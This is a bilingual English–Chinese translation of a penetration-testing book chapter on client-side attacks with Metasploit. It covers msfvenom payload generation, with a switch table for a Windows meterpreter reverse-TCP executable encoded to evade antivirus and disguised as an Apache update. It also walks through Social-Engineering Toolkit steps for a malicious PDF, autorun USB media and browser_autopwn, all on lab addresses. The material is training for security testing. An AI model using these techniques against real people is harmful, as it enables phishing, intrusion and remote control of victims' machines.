- en: Client-side Attacks with Metasploit
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用Metasploit进行客户端攻击
- en: 'In the previous chapter, we learned to use various tools such as NMAP and Nessus
    to directly exploit vulnerabilities in the target system. However, the techniques
    that we learned are useful if the attacker''s system and the target system are
    within the same network. In this chapter, we''ll see an overview of techniques
    used to exploit systems, which are located in different networks altogether. The
    topics to be covered in this chapter are as follows:'
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在上一章中，我们学习了如何使用各种工具，如NMAP和Nessus，直接利用目标系统中的漏洞。然而，我们学到的技术只有在攻击者的系统和目标系统在同一网络中时才有用。在本章中，我们将概述用于利用完全位于不同网络中的系统的技术。本章将涵盖以下主题：
- en: Understanding key terminology related to client-side attacks
  id: totrans-2
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 理解与客户端攻击相关的关键术语
- en: Using msfvenom to generate custom payloads
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用msfvenom生成自定义有效载荷
- en: Using Social-Engineering Toolkit
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用社会工程工具包
- en: Advanced browser-based attacks using the `browser_autopwn` auxiliary module
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用`browser_autopwn`辅助模块进行高级基于浏览器的攻击
- en: Need of client-side attacks
  id: totrans-6
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 客户端攻击的需求
- en: In the previous chapter, we used the MS08_067net api vulnerability in our target
    system and got complete administrator-level access to the system. We configured
    the value of the RHOST variable as the IP address of our target system. Now, the
    exploit was successful only because the attacker's system and the target system
    both were on the same network. (The IP address of attacker's system was `192.168.44.134`
    and the IP address of target system was `192.168.44.129`).
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: 在上一章中，我们在目标系统中使用了MS08_067net api漏洞，并获得了对系统的完全管理员级访问权限。我们将RHOST变量的值配置为目标系统的IP地址。现在，只有在攻击者的系统和目标系统都在同一网络中时，攻击才会成功。（攻击者系统的IP地址为`192.168.44.134`，目标系统的IP地址为`192.168.44.129`）。
- en: 'This scenario was pretty straightforward as shown in the following diagram:'
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 如下图所示，这种情况非常直接：
- en: '![](img/111651aa-ff4e-4af5-bd7d-8135a10fa6cd.jpg)'
  id: totrans-9
  prefs: []
  type: TYPE_IMG
  zh: '![](img/111651aa-ff4e-4af5-bd7d-8135a10fa6cd.jpg)'
- en: 'Now, consider a scenario shown in the following diagram. The IP address of
    the attacker system is a *public* address and he is trying to exploit a vulnerability
    on a system, which is not in same network. Note, the target system, in this case,
    has a private IP address (`10.11.1.56`) and is NAT''ed behind an internet router
    (`88.43.21.9x`). So, there''s no direct connectivity between the attacker''s system
    and the target system. By setting RHOST to `89.43.21.9`, the attacker can reach
    only the internet router and not the desired target system. In this case, we need
    to adopt another approach for attacking our target system known as client-side
    attacks:'
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，考虑下面图中显示的情景。攻击者系统的IP地址是一个*公共*地址，他试图利用不在同一网络中的系统上的漏洞。请注意，目标系统在这种情况下具有私有IP地址（`10.11.1.56`）并且在互联网路由器（`88.43.21.9x`）后进行了NAT。因此，攻击者的系统和目标系统之间没有直接的连接。通过将RHOST设置为`89.43.21.9`，攻击者只能到达互联网路由器，而无法到达所需的目标系统。在这种情况下，我们需要采用另一种攻击目标系统的方法，即客户端攻击：
- en: '![](img/7aade532-9f47-47be-98f0-bd7da899ecfd.jpg)'
  id: totrans-11
  prefs: []
  type: TYPE_IMG
  zh: '![](img/7aade532-9f47-47be-98f0-bd7da899ecfd.jpg)'
- en: What are client-side attacks?
  id: totrans-12
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 什么是客户端攻击？
- en: 'As we have seen in the preceding section, if the target system is not in the
    same network as that of the attacker, then the attacker cannot reach the target
    system directly. In this case, the attacker will have to send the payload to the
    target system by some other means. Some of the techniques for delivering the payload
    to the target system are:'
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 正如我们在前面的部分中看到的，如果目标系统不在攻击者的网络中，那么攻击者无法直接到达目标系统。在这种情况下，攻击者将不得不通过其他方式将有效载荷发送到目标系统。将有效载荷传递到目标系统的一些技术包括：
- en: The attacker hosts a website with the required malicious payload and sends it
    to the victim.
  id: totrans-14
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 攻击者托管一个包含所需恶意有效载荷的网站，并将其发送给受害者。
- en: The attacker sends the payload embedded in any innocent looking file such as
    DOC, PDF, or XLS to the victim over email.
  id: totrans-15
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 攻击者将有效载荷嵌入到任何看似无害的文件中，如DOC、PDF或XLS，并通过电子邮件发送给受害者。
- en: The attacker sends the payload using an infected media drive (such as USB flash
    drive, CD, or DVD)
  id: totrans-16
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 攻击者使用感染的媒体驱动器（如USB闪存驱动器、CD或DVD）发送有效载荷
- en: Now, once the payload has been sent to the victim, the victim needs to perform
    the required action in order to trigger the payload. Once the payload is triggered,
    it will connect back to the attacker and give him the required access. Most of
    the client-side attacks require the victim to perform some kind of action or other.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，一旦有效载荷被发送到受害者，受害者需要执行所需的操作以触发有效载荷。一旦有效载荷被触发，它将连接到攻击者并为他提供所需的访问权限。大多数客户端攻击需要受害者执行某种操作或其他。
- en: 'The following flowchart summarizes how client-side attacks work:'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 以下流程图总结了客户端攻击的工作原理：
- en: '![](img/a115f914-bbe2-40c8-bec1-a6bd3a300dda.jpg)'
  id: totrans-19
  prefs: []
  type: TYPE_IMG
  zh: '![](img/a115f914-bbe2-40c8-bec1-a6bd3a300dda.jpg)'
- en: What is a Shellcode?
  id: totrans-20
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 什么是Shellcode？
- en: 'Let''s break the word shellcode into shell and code. In simple terms, a shellcode
    is a code that is designed to give a shell access of the target system. Practically,
    a shellcode can do lot more than just giving shell access. It all depends on what
    actions are defined in the shellcode. For executing client-side attacks, we need
    to choose the precise shellcode that will be part of our payload. Let''s assume,
    there''s a certain vulnerability in the target system, the attacker can write
    a shellcode to exploit that vulnerability. A shell code is a typically hex encoded
    data and may look like this:'
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们把单词shellcode分解成shell和code。简单来说，shellcode是一种旨在给目标系统提供shell访问权限的代码。实际上，shellcode可以做的远不止提供shell访问权限。这完全取决于shellcode中定义的操作。为了执行客户端攻击，我们需要选择精确的shellcode作为有效载荷的一部分。假设目标系统存在某种漏洞，攻击者可以编写一个shellcode来利用该漏洞。Shellcode通常是十六进制编码的数据，可能看起来像这样：
- en: '[PRE0]'
  id: totrans-22
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: What is a reverse shell?
  id: totrans-23
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 什么是反向Shell？
- en: A reverse shell is a type of shell, which, upon execution, connects back to
    the attacker's system giving shell access.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 反向shell是一种shell类型，执行后会连接到攻击者的系统，提供shell访问权限。
- en: What is a bind shell?
  id: totrans-25
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 什么是绑定shell？
- en: A bind shell is a type of shell, which, upon execution, actively listens for
    connections on a particular port. The attacker can then connect to this port in
    order to get shell access.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 绑定shell是一种shell类型，执行时会主动监听特定端口上的连接。攻击者可以连接到该端口以获取shell访问权限。
- en: What is an encoder?
  id: totrans-27
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 什么是编码器？
- en: The `msfvenom` utility would generate a payload for us. However, the possibility
    of our payload getting detected by antivirus on the target system is quite high.
    Almost all industry leading antivirus and security software programs have signatures
    to detect Metasploit payloads. If our payload gets detected, it would render useless
    and our exploit would fail. This is exactly where the encoder comes to rescue.
    The job of the encoder is to obfuscate the generated payload in such a way that
    it doesn't get detected by antivirus or similar security software programs.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: '`msfvenom`实用程序将为我们生成有效载荷。然而，我们的有效载荷在目标系统上被杀毒软件检测到的可能性非常高。几乎所有行业领先的杀毒软件和安全软件程序都有签名来检测Metasploit有效载荷。如果我们的有效载荷被检测到，它将变得无用，我们的利用将失败。这正是编码器发挥作用的地方。编码器的工作是以一种不被杀毒软件或类似安全软件程序检测到的方式对生成的有效载荷进行混淆。'
- en: The msfvenom utility
  id: totrans-29
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: msfvenom实用程序
- en: Earlier, the Metasploit Framework offered two different utilities, namely, `msfpayload`
    and `msfencode.` The `msfpayload` was used to generate a payload in a specified
    format and the `msfencode` was used to encode and obfuscate the payload using
    various algorithms. However, the newer and the latest version of the Metasploit
    Framework has combined both of these utilities into a single utility called `msfvenom`.
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 早些时候，Metasploit框架提供了两个不同的实用程序，即`msfpayload`和`msfencode`。`msfpayload`用于生成指定格式的有效载荷，而`msfencode`用于使用各种算法对有效载荷进行编码和混淆。然而，Metasploit框架的更新和最新版本将这两个实用程序合并为一个称为`msfvenom`的单一实用程序。
- en: 'The `msfvenom` utility can generate a payload as well as encode the same in
    a single command. We shall see a few commands next:'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: '`msfvenom`实用程序可以在单个命令中生成有效载荷并对其进行编码。接下来我们将看到一些命令：'
- en: The `msfvenom` is a separate utility and doesn't require `msfconsole` to be
    running at same time.
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: '`msfvenom`是一个独立的实用程序，不需要同时运行`msfconsole`。'
- en: '**List payloads**: The `msfvenom` utility supports all standard Metasploit
    payloads. We can list all the available payloads using the `msfvenom --list payloads`
    command as shown in the following screenshot:'
  id: totrans-33
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**列出有效载荷**：`msfvenom`实用程序支持所有标准的Metasploit有效载荷。我们可以使用`msfvenom --list payloads`命令列出所有可用的有效载荷，如下面的屏幕截图所示：'
- en: '![](img/9f513895-004b-446b-9de3-5d7c50cdf0b9.jpg)'
  id: totrans-34
  prefs: []
  type: TYPE_IMG
  zh: '![](img/9f513895-004b-446b-9de3-5d7c50cdf0b9.jpg)'
- en: '**List encoders**: As we have discussed earlier, the `msfvenom` is a single
    utility, which can generate as well as encode the payload. It supports all standard
    Metasploit encoders. We can list all the available encoders using the `msfvenom
    --list encoders` command, as shown in the following screenshot:'
  id: totrans-35
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**列出编码器**：正如我们之前讨论的，`msfvenom`是一个单一的实用程序，可以生成以及编码有效载荷。它支持所有标准的Metasploit编码器。我们可以使用`msfvenom
    --list encoders`命令列出所有可用的编码器，如下面的屏幕截图所示：'
- en: '![](img/c44fc94e-1cd6-47fd-aca5-51b2955c80e9.jpg)'
  id: totrans-36
  prefs: []
  type: TYPE_IMG
  zh: '![](img/c44fc94e-1cd6-47fd-aca5-51b2955c80e9.jpg)'
- en: '**List formats**: While generating a payload, we need to instruct the `msfvenom`
    utility about the file format that we need our payload to be generated in. We
    can use the `msfvenom --help` formats command to view all the supported payload
    output formats:'
  id: totrans-37
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**列出格式**：在生成有效载荷时，我们需要指示`msfvenom`实用程序我们需要将有效载荷生成为的文件格式。我们可以使用`msfvenom --help
    formats`命令查看所有支持的有效载荷输出格式：'
- en: '![](img/c1c55766-20fc-40f8-8ba5-8e3b051ae4b4.jpg)'
  id: totrans-38
  prefs: []
  type: TYPE_IMG
  zh: '![](img/c1c55766-20fc-40f8-8ba5-8e3b051ae4b4.jpg)'
- en: '**List platforms**: While we generate a payload, we also need to instruct the
    `msfvenom` utility about what platform is our payload going to run on. We can
    use the `msfvenom --help-platforms` command to list all the supported platforms:'
  id: totrans-39
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**列出平台**：在生成有效载荷的同时，我们还需要指示`msfvenom`实用程序我们的有效载荷将在哪个平台上运行。我们可以使用`msfvenom --help-platforms`命令列出所有支持的平台：'
- en: '![](img/a6c5332a-9617-4eb9-b1f4-c763371307d7.jpg)'
  id: totrans-40
  prefs: []
  type: TYPE_IMG
  zh: '![](img/a6c5332a-9617-4eb9-b1f4-c763371307d7.jpg)'
- en: Generating a payload with msfvenom
  id: totrans-41
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用msfvenom生成有效载荷
- en: 'Now that we are familiar with what all payloads, encoders, formats, and platforms
    the `msfvenom` utility supports, let''s try generating a sample payload as shown
    in the following screenshot:'
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经熟悉了`msfvenom`实用程序支持的所有有效载荷、编码器、格式和平台，让我们尝试生成一个示例有效载荷，如下面的屏幕截图所示：
- en: '![](img/9014fdb6-b1c9-4c40-a5fd-50ed1cd45567.jpg)'
  id: totrans-43
  prefs: []
  type: TYPE_IMG
  zh: '![](img/9014fdb6-b1c9-4c40-a5fd-50ed1cd45567.jpg)'
- en: 'The following table shows a detailed explanation for each of the command switches
    used in the preceding `msfvenom` command:'
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 以下表格显示了在前述`msfvenom`命令中使用的每个命令开关的详细说明：
- en: '| **Switch** | **Explanation** |'
  id: totrans-45
  prefs: []
  type: TYPE_TB
  zh: '| **开关** | **说明** |'
- en: '| `-a x86` | Here, the generated payload will run on x86 architecture |'
  id: totrans-46
  prefs: []
  type: TYPE_TB
  zh: '| `-a x86` | 这里，生成的有效载荷将在x86架构上运行 |'
- en: '| `--platform windows` | Here, the generated payload is targeted for the Windows
    platform |'
  id: totrans-47
  prefs: []
  type: TYPE_TB
  zh: '| `--platform windows` | 这里，生成的有效载荷针对Windows平台 |'
- en: '| `-p windows/meterpreter/reverse_tcp` | Here, the payload is the meterpreter
    with a reverse TCP |'
  id: totrans-48
  prefs: []
  type: TYPE_TB
  zh: '| `-p windows/meterpreter/reverse_tcp` | 这里，有效载荷是带有反向TCP的meterpreter |'
- en: '| `LHOST= 192.168.44.134` | Here, the IP address of the attacker''s system
    is `192.168.44.134` |'
  id: totrans-49
  prefs: []
  type: TYPE_TB
  zh: '| `LHOST= 192.168.44.134` | 这里，攻击者系统的IP地址是`192.168.44.134` |'
- en: '| `LPORT= 8080` | Here, the port number to listen on the attacker''s system
    is `8080` |'
  id: totrans-50
  prefs: []
  type: TYPE_TB
  zh: '| `LPORT= 8080` | 这里，攻击者系统上监听的端口号是`8080` |'
- en: '| `-e x86/shikata_ga_nai` | Here, the payload encoder to be used is `shikata_ga_nai`
    |'
  id: totrans-51
  prefs: []
  type: TYPE_TB
  zh: '| `-e x86/shikata_ga_nai` | 这里，要使用的有效载荷编码器是`shikata_ga_nai` |'
- en: '| `-f exe` | Here, the output format for the payload is `exe` |'
  id: totrans-52
  prefs: []
  type: TYPE_TB
  zh: '| `-f exe` | 这里，有效载荷的输出格式是`exe` |'
- en: '| `-o /root/Desktop/apache-update.exe` | This is the path where the generated
    payload would be saved |'
  id: totrans-53
  prefs: []
  type: TYPE_TB
  zh: '| `-o /root/Desktop/apache-update.exe` | 这是生成的有效载荷将保存的路径 |'
- en: 'Once we have generated a payload, we need to setup a listener, which would
    accept reverse connections once the payload gets executed on our target system.
    The following command will start a meterpreter listener on the IP address `192.168.44.134`
    on port `8080`:'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦我们生成了一个载荷，我们需要设置一个监听器，一旦在目标系统上执行了载荷，它将接受反向连接。以下命令将在IP地址`192.168.44.134`上的端口`8080`上启动一个meterpreter监听器：
- en: '[PRE1]'
  id: totrans-55
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: '![](img/61aaa5da-67dc-4c3f-999a-ebce60a4f57f.jpg)'
  id: totrans-56
  prefs: []
  type: TYPE_IMG
  zh: '![](img/61aaa5da-67dc-4c3f-999a-ebce60a4f57f.jpg)'
- en: 'Now, we have sent the payload disguised as an Apache update to our victim.
    The victim needs to execute it in order to complete the exploit:'
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们已将载荷伪装成Apache更新发送给了我们的受害者。受害者需要执行它以完成利用：
- en: '![](img/121c0525-b774-4a16-8fa2-cf66752a7b32.jpg)'
  id: totrans-58
  prefs: []
  type: TYPE_IMG
  zh: '![](img/121c0525-b774-4a16-8fa2-cf66752a7b32.jpg)'
- en: 'As soon as the victim executes the `apache-update.exe` file, we get an active
    meterpreter session back on the listener we setup earlier (as shown in the following
    screenshot):'
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦受害者执行`apache-update.exe`文件，我们就会在之前设置的监听器上获得一个活动的meterpreter会话（如下截图所示）：
- en: '![](img/50a1691c-8d07-4e05-b63c-7b9c0e93b3eb.jpg)'
  id: totrans-60
  prefs: []
  type: TYPE_IMG
  zh: '![](img/50a1691c-8d07-4e05-b63c-7b9c0e93b3eb.jpg)'
- en: 'Another interesting payload format is VBA. The payload generated in VBA format,
    as shown in the following screenshot, can be embedded in a macro in any Word/Excel
    document:'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 另一种有趣的载荷格式是VBA。如下截图所示，以VBA格式生成的载荷可以嵌入到任何Word/Excel文档的宏中：
- en: '![](img/b6ede9c5-6ac3-412b-8ec6-555cd440e498.jpg)'
  id: totrans-62
  prefs: []
  type: TYPE_IMG
  zh: '![](img/b6ede9c5-6ac3-412b-8ec6-555cd440e498.jpg)'
- en: Social Engineering with Metasploit
  id: totrans-63
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用Metasploit进行社会工程
- en: Social engineering is an art of manipulating human behavior in order to bypass
    the security controls of the target system. Let's take the example of an organization,
    which follows very stringent security practices. All the systems are hardened
    and patched. The latest security software is deployed. Technically, it's very
    difficult for an attacker to find and exploit any vulnerability. However, the
    attacker somehow manages to befriend the network administrator of that organization
    and then tricks him to reveal the admin credentials. This is a classic example
    where humans are always the weakest link in the security chain.
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 社会工程是一种操纵人类行为的艺术，以绕过目标系统的安全控制。让我们以一个遵循非常严格安全实践的组织为例。所有系统都经过了加固和修补。最新的安全软件已部署。从技术上讲，攻击者很难找到并利用任何漏洞。然而，攻击者以某种方式设法与该组织的网络管理员交友，然后欺骗他透露管理员凭据。这是一个经典的例子，人类始终是安全链中最薄弱的环节。
- en: Kali Linux, by default, has a powerful social engineering tool, which seamlessly
    integrates with Metasploit to launch targeted attacks. In Kali Linux, the Social-Engineering
    Toolkit is located under Exploitation Tools | Social Engineering Toolkit.
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 默认情况下，Kali Linux具有一个强大的社会工程工具，可以与Metasploit无缝集成，以发动有针对性的攻击。在Kali Linux中，社会工程工具包位于Exploitation
    Tools | Social Engineering Toolkit下。
- en: Generating malicious PDF
  id: totrans-66
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 生成恶意PDF
- en: 'Open the Social Engineering Toolkit and select the first option Spear-Phishing
    Attack Vectors, as shown in the following screenshot. Then select the second option
    Create a File Format Payload:'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 打开社会工程工具包，并选择第一个选项Spear-Phishing Attack Vectors，如下截图所示。然后选择第二个选项Create a File
    Format Payload：
- en: '![](img/4141fff5-60fe-42f7-8991-dc871b8368d1.jpg)'
  id: totrans-68
  prefs: []
  type: TYPE_IMG
  zh: '![](img/4141fff5-60fe-42f7-8991-dc871b8368d1.jpg)'
- en: 'Now, select option 14 to use the `Adobe util.printf() Buffer Overflow` exploit:'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，选择选项14使用`Adobe util.printf() Buffer Overflow`利用：
- en: '![](img/f0cbdedb-ea6c-4a98-a8ae-473bc7e04dec.jpg)'
  id: totrans-70
  prefs: []
  type: TYPE_IMG
  zh: '![](img/f0cbdedb-ea6c-4a98-a8ae-473bc7e04dec.jpg)'
- en: 'Select option 1 to use Windows Reverse TCP Shell as the payload for our exploit.
    Then, set the IP address of the attacker''s machine using the LHOST variable (in
    this case, it''s `192.168.44.134`) and the port to listen on (in this case, `443`):'
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 选择选项1，将Windows Reverse TCP Shell作为我们的利用载荷。然后，使用LHOST变量设置攻击者机器的IP地址（在本例中是`192.168.44.134`）和要监听的端口（在本例中是`443`）：
- en: '![](img/d914a2d0-231e-44d4-a00b-4c77d13392d1.jpg)'
  id: totrans-72
  prefs: []
  type: TYPE_IMG
  zh: '![](img/d914a2d0-231e-44d4-a00b-4c77d13392d1.jpg)'
- en: 'The PDF file got generated in the directory `/root/.set/`. Now we need to send
    it to our victim using any of the available communication mediums. Meanwhile,
    we also need to start a listener, which will accept the reverse meterpreter connection
    from our target. We can start a listener using the following command:'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: PDF文件已在目录`/root/.set/`中生成。现在我们需要使用任何可用的通信媒介将其发送给我们的受害者。同时，我们还需要启动一个监听器，该监听器将接受来自目标的反向meterpreter连接。我们可以使用以下命令启动监听器：
- en: '[PRE2]'
  id: totrans-74
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'On the other end, our victim received the PDF file and tried to open it using
    Adobe Reader. The Adobe Reader crashed however, there''s no sign that would indicate
    the victim of a compromise:'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 另一方面，我们的受害者收到了PDF文件，并尝试使用Adobe Reader打开它。Adobe Reader崩溃了，但没有迹象表明受害者受到了威胁：
- en: '![](img/b642bc1f-1c93-4e9c-afdb-3d4690c4a463.jpg)'
  id: totrans-76
  prefs: []
  type: TYPE_IMG
  zh: '![](img/b642bc1f-1c93-4e9c-afdb-3d4690c4a463.jpg)'
- en: 'Back on the listener end (on the attacker''s system), we have got a new meterpreter
    shell! We can see this in following screenshot:'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 在监听端（攻击者系统上），我们得到了一个新的meterpreter shell！我们可以在下面的截图中看到这一点：
- en: '![](img/5d733890-4f7b-4a57-b255-0a23733c83f4.jpg)'
  id: totrans-78
  prefs: []
  type: TYPE_IMG
  zh: '![](img/5d733890-4f7b-4a57-b255-0a23733c83f4.jpg)'
- en: Creating infectious media drives
  id: totrans-79
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 创建传染性媒体驱动器
- en: 'Open the Social Engineering Toolkit and from the main menu, select option 3
    Infectious Media Generator as shown in the following screenshot. Then, select
    option 2 to create a Standard Metasploit Executable:'
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 打开社会工程工具包，从主菜单中选择选项3 传染性媒体生成器，如下截图所示。然后，选择选项2创建标准的Metasploit可执行文件：
- en: '![](img/bf1e1374-7e0e-46bf-afd0-0849788695c6.jpg)'
  id: totrans-81
  prefs: []
  type: TYPE_IMG
  zh: '![](img/bf1e1374-7e0e-46bf-afd0-0849788695c6.jpg)'
- en: 'Now, select option 1 to use Windows Shell Reverse TCP as the payload for our
    exploit. Then, set the IP address in the LHOST variable and port to listen on:'
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，选择选项1，将Windows Shell Reverse TCP作为我们的利用载荷。然后，在LHOST变量中设置IP地址和要监听的端口：
- en: '![](img/bd7b7dda-3caf-4631-8bfc-35cd4e2381c2.jpg)'
  id: totrans-83
  prefs: []
  type: TYPE_IMG
  zh: '![](img/bd7b7dda-3caf-4631-8bfc-35cd4e2381c2.jpg)'
- en: The Social Engineering Toolkit will generate a folder called *autorun* located
    at `/root/.set/`. This folder can be copied to the USB Flash Drive or CD/DVD ROM's
    to distribute it to our victim. Meanwhile, we would also need to set up a listener
    (as shown in the earlier section) and then wait for our victim to insert the infected
    media into his system.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 社会工程工具包将生成一个名为*autorun*的文件夹，位于`/root/.set/`。这个文件夹可以复制到USB闪存驱动器或CD/DVD-ROM中，以分发给我们的受害者。与此同时，我们还需要设置一个监听器（如前面部分所示），然后等待我们的受害者将受感染的媒体插入他的系统。
- en: Browser Autopwn
  id: totrans-85
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 浏览器自动攻击
- en: 'Another interesting auxiliary module for performing client-side attacks is
    the `browser_autopwn`. This auxiliary module works in the following sequence:'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 用于执行客户端攻击的另一个有趣的辅助模块是`browser_autopwn`。这个辅助模块按以下顺序工作：
- en: The attacker executes the `browser_autopwn` auxiliary module.
  id: totrans-87
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 攻击者执行`browser_autopwn`辅助模块。
- en: A web server is initiated (on the attacker's system), which hosts a payload.
    The payload is accessible over a specific URL.
  id: totrans-88
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 攻击者在其系统上启动一个Web服务器，托管一个载荷。这个载荷可以通过特定的URL访问。
- en: The attacker sends the specially generated URL to his victim.
  id: totrans-89
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 攻击者向受害者发送特制的URL。
- en: The victim tries to open the URL, which is when the payload gets downloaded
    on his system.
  id: totrans-90
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 受害者试图打开URL，这时载荷就会下载到他的系统上。
- en: If the victim's browser is vulnerable, the exploit is successful and the attacker
    gets a meterpreter shell.
  id: totrans-91
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果受害者的浏览器存在漏洞，攻击成功，攻击者就会获得一个meterpreter shell。
- en: 'From the `msfconsole`, select the `browser_autopwn` module using the use `auxiliary/server/browser_autopwn` command
    as shown in the following screenshot. Then, configure the value of the LHOST variable
    and run the auxiliary module:'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 从`msfconsole`中，使用`use auxiliary/server/browser_autopwn`命令选择`browser_autopwn`模块，如下截图所示。然后，配置LHOST变量的值并运行辅助模块：
- en: '![](img/f388f8bb-66f0-44f5-a5a2-ddb2d3d525da.png)'
  id: totrans-93
  prefs: []
  type: TYPE_IMG
  zh: '![](img/f388f8bb-66f0-44f5-a5a2-ddb2d3d525da.png)'
- en: 'Running the auxiliary module will create many different instances of exploit/payload
    combinations as the victim might be using any kind of browser:'
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 运行辅助模块将创建许多不同的利用/载荷组合实例，因为受害者可能使用任何类型的浏览器：
- en: '![](img/125152ae-8b2f-4627-96e1-e4ae1f3c5029.png)'
  id: totrans-95
  prefs: []
  type: TYPE_IMG
  zh: '![](img/125152ae-8b2f-4627-96e1-e4ae1f3c5029.png)'
- en: 'On the target system, our victim opened up an Internet Explorer and tried to
    hit the malicious URL `http://192.168.44.134:8080` (that we setup using the `browser_autopwn`
    auxiliary module):'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 在目标系统上，我们的受害者打开了Internet Explorer，并尝试访问恶意URL `http://192.168.44.134:8080`（我们使用`browser_autopwn`辅助模块设置的）：
- en: '![](img/b9c52092-505d-421a-9bfb-72964643e633.png)'
  id: totrans-97
  prefs: []
  type: TYPE_IMG
  zh: '![](img/b9c52092-505d-421a-9bfb-72964643e633.png)'
- en: 'Back on our Metasploit system, we got a meterpreter shell as soon as our victim
    opened the specially crafted URL:'
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 回到我们的Metasploit系统，我们的受害者一打开特制的URL，我们就获得了一个meterpreter shell：
- en: '![](img/9a2a8c5b-fc48-4c01-84f6-c71d727932da.jpg)'
  id: totrans-99
  prefs: []
  type: TYPE_IMG
  zh: '![](img/9a2a8c5b-fc48-4c01-84f6-c71d727932da.jpg)'
- en: Summary
  id: totrans-100
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we learned how to use various tools and techniques in order
    to launch advanced client-side attacks and bypass the network perimeter restrictions.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们学习了如何使用各种工具和技术来发动高级客户端攻击并绕过网络边界限制。
- en: In the next chapter, we'll deep dive into Metasploit's capabilities for testing
    the security of web applications.
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将深入探讨Metasploit在测试Web应用程序安全性方面的能力。
- en: Exercises
  id: totrans-103
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 练习
- en: 'You can try the following exercises:'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以尝试以下练习：
- en: Get familiar with various parameters and switches of `msfvenom`
  id: totrans-105
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 熟悉`msfvenom`的各种参数和开关
- en: Explore various other social engineering techniques provided by Social Engineering
    Toolkit
  id: totrans-106
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 探索社会工程工具包提供的各种其他社会工程技术
